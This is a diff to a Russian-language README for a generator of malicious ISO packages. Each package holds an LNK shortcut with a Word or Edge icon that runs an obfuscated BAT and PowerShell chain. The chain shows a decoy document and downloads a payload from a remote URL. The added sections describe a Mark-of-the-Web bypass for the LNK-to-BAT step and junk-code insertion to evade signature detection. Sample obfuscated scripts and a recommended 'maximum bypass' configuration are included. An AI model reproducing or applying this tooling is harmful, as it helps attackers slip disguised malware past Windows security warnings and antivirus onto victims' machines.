@@ -74,6 +74,8 @@ python3 generate.py
 | `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
 | `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP-архивов |
 | `DELIVERY_METHOD` | нет | `webclient` | Метод доставки payload (см. ниже) |
+| `LNK_BYPASS` | нет | _(пусто = off)_ | Обход MOTW-проверки LNK (см. ниже) |
+| `JUNK_CODE` | нет | _(пусто = off)_ | Вставка мусорного кода в BAT и PS1 (см. ниже) |
 
 Пример `.env`:
 
@@ -82,14 +84,37 @@ LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
 API_KEY=your-api-key-here
 TARGET_FILENAME=cat.exe
 DELIVERY_METHOD=webclient
+LNK_BYPASS=1
+JUNK_CODE=1
 ```
 
-Альтернативно -- через `export`:
+Альтернативно -- через переменные окружения:
+
+**PowerShell (Windows):**
+
+```powershell
+$env:LAMBDA_URL="https://..."
+$env:API_KEY="..."
+$env:DELIVERY_METHOD="base64_recycle"
+$env:LNK_BYPASS="1"
+$env:JUNK_CODE="1"
+python generate.py
+```
+
+Однострочник (PowerShell):
+
+```powershell
+$env:JUNK_CODE="1"; $env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
+```
+
+**Bash (Linux / Git Bash):**
 
 ```bash
 export LAMBDA_URL='https://...'
 export API_KEY='...'
 export DELIVERY_METHOD='base64_recycle'
+export LNK_BYPASS=1
+export JUNK_CODE=1
 python3 generate.py
 ```
 
@@ -206,6 +231,113 @@ HostUrl=https://...
 
 `ZoneId=3` означает "Internet Zone". При запуске exe Windows видит эту метку и показывает предупреждение SmartScreen. Метод `base64_recycle` не создаёт этот поток, а если он случайно появился -- удаляет.
 
+## LNK MOTW Bypass (LNK_BYPASS)
+
+На Windows 11 22H2+ (после патча CVE-2022-41091) при клике на LNK внутри ISO с MOTW появляется "Open File Security Warning". Причина: аргументы LNK используют `start /min .\bat` — команда `start` вызывает `ShellExecuteEx`, который проверяет MOTW на BAT-файле.
+
+### Как включить
+
+```env
+LNK_BYPASS=1
+```
+
+Любое непустое значение = ON. Пустое или отсутствует = off (старое поведение).
+
+### Что меняется
+
+| | `LNK_BYPASS` off (по умолчанию) | `LNK_BYPASS` on |
+|---|---|---|
+| LNK arguments | `/c "start /min .\bat"` | `/c ".\bat"` |
+| Window style | 1 (SW_SHOWNORMAL) | 7 (SW_SHOWMINNOACTIVE) |
+| API для запуска BAT | `ShellExecuteEx` (через `start`) | cmd internal execution |
+| MOTW check на BAT | **Да** — SmartScreen проверяет | **Нет** — cmd обрабатывает BAT внутренне |
+
+### Почему это работает
+
+`start` — это команда cmd.exe, которая внутри вызывает `ShellExecuteEx` для запуска целевого файла. `ShellExecuteEx` проверяет Zone.Identifier (MOTW) и показывает предупреждение.
+
+`cmd.exe /c .\bat` — cmd.exe **не** использует ShellExecute для выполнения BAT. Он читает файл и выполняет строки BAT-скрипта внутри своего процесса. Поэтому MOTW-проверка не срабатывает.
+
+`window_style=7` (SW_SHOWMINNOACTIVE) обеспечивает минимизацию окна cmd.exe, так как без `start /min` окно cmd не будет автоматически скрыто.
+
+### Верификация
+
+```powershell
+$env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
+```
+
+Затем: разблокировать ISO (Properties → Unblock) → смонтировать → кликнуть LNK → BAT должен выполниться без "Open File Security Warning".
+
+## Мусорный код (JUNK_CODE)
+
+Вставляет мёртвый (неисполняемый) код в генерируемые BAT и PS1 скрипты для увеличения энтропии и снижения вероятности сигнатурного детекта.
+
+### Как включить
+
+```env
+JUNK_CODE=1
+```
+
+Любое непустое значение = ON. Пустое или отсутствует = off.
+
+### Что вставляется в BAT
+
+| Тип | Количество | Пример |
+|-----|:---:|---------|
+| Мёртвые `SET` переменные | 3-6 | `set "xkjf=48291"` |
+| `IF DEFINED` с несуществующей переменной | 1-2 | `if defined QXZ goto chkDisk` |
+| Мёртвые метки с `GOTO :skip` | 1-2 | `goto :skip_initNet` / `:initNet` / `REM ...` / `:skip_initNet` |
+
+Пример BAT с JUNK_CODE=1:
+
+```batch
+@echo off
+cd /d "%~dp0"
+REM System diagnostic module v3.2.1
+set "c=ell"
+set "xkjf=48291"
+if defined QXZ goto chkDisk
+set "a=pow"
+goto :skip_initNet
+:initNet
+REM make time 472
+:skip_initNet
+set "mwp=a3e8f1"
+REM Checking system integrity...
+set "b=ersh"
+...
+start xyz.docx
+%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
+```
+
+### Что вставляется в PS1
+
+| Тип | Количество | Пример |
+|-----|:---:|---------|
+| Мёртвые функции | 2-4 | `function Get-ConfigState { param([int]$x = 42831); ... }` |
+| Мёртвые переменные | 3-6 | `$NtQueryObjZwAllocMem47 = 0x3a2f` |
+
+**Паттерны функций** (выбираются случайно):
+
+- **XOR-вычисление:** `param([int]$x = N); $var = $x -bxor M; return $var`
+- **Hashtable lookup:** `$var = @{'key1'=N; 'key2'=M}; return $var.Keys.Count`
+- **String manipulation:** `param([string]$s = '...'); $var = $s.Length -band 0xFF; return $var`
+
+Имена функций в стиле PowerShell cmdlet: `Get-ConfigState`, `Test-CertStore`, `Invoke-BufferSize` и т.д.
+
+Имена переменных в стиле Windows API: `$NtQueryObjZwAllocMem47`, `$RtlInitStrPsGetProc83` и т.д.
+
+### Комбинация с другими опциями
+
+Рекомендуемый набор для максимального обхода:
+
+```powershell
+$env:DELIVERY_METHOD="base64_recycle"   # обход MOTW для payload
+$env:LNK_BYPASS="1"                     # обход MOTW для LNK->BAT
+$env:JUNK_CODE="1"                      # мусорный код для антидетекта
+python generate.py
+```
+
 ## Структура проекта
 
 ```
@@ -289,8 +421,9 @@ exam-gen/
 LNK создаётся без `WorkingDirectory` -- Windows автоматически использует директорию ярлыка (точку монтирования ISO) как рабочую папку. Это обеспечивает корректный запуск BAT при клике на LNK с любого диска.
 
 - Target: `C:\Windows\System32\cmd.exe`
-- Arguments: `/c "start /min .\{bat}"`
-- ShowCommand: 1 (Normal) -- окно cmd.exe мелькает минимально, BAT запускается через `start /min`
+- Arguments (по умолчанию): `/c "start /min .\{bat}"` — BAT запускается через `start /min`
+- Arguments (LNK_BYPASS=1): `/c ".\{bat}"` — BAT запускается напрямую через cmd
+- ShowCommand: 1 (Normal) или 7 (SW_SHOWMINNOACTIVE при LNK_BYPASS)
 - Icon: Word (`SHELL32.dll,1`) или Edge (`msedge.exe,11`)
 
 ## Обфускация
@@ -311,7 +444,7 @@ start xyz.docx
 %a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
 ```
 
-`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии.
+`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии. При `JUNK_CODE=1` дополнительно вставляются мёртвые SET-переменные, IF-GOTO и метки (подробнее в разделе "Мусорный код").
 
 ### PS1 (подстановочный шифр + Base64)
 
@@ -322,6 +455,7 @@ start xyz.docx
 3. Рандомные имена переменных -- стиль Windows API / Hex
 4. Рандомные placeholder-теги (##xxxx##) для URL и filename
 5. Invoke-Expression -- финальное выполнение
+6. При JUNK_CODE=1: мёртвые функции и переменные (подробнее в разделе "Мусорный код")
 ```
 
 ## Проверка результатов
